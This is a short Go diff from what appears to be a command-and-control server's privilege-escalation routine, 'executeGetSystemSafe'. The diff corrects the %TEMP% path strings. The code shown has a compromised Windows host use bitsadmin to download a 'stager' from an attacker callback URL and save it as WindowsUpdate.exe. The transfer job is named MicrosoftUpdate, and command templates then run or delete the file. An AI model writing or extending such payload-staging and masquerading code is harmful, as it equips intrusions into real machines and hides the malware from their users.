@@ -3272,7 +3272,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					
 					if !hasDownloaded {
 						// First copy command - download the file first
-						filePath := `%%TEMP%%\WindowsUpdate.exe`
+						filePath := `%TEMP%\WindowsUpdate.exe`
 						downloadCmd := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s`, callbackURL, filePath)
 						downloadTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
 						downloadTask := &tasks.Task{
@@ -3285,14 +3285,14 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
 					}
 					
-					filePath := `%%TEMP%%\WindowsUpdate.exe`
+					filePath := `%TEMP%\WindowsUpdate.exe`
 					cmd = fmt.Sprintf(cmdTemplate, filePath)
 				} else if isDelCommand {
 					// For del commands, use template as-is (no %s placeholder)
 					if strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `Program Files`) {
 						cmd = cmdTemplate // Template already has correct path
 					} else {
-						filePath := `%%TEMP%%\WindowsUpdate.exe`
+						filePath := `%TEMP%\WindowsUpdate.exe`
 						cmd = fmt.Sprintf(cmdTemplate, filePath)
 					}
 				} else if isSchTasksTr {
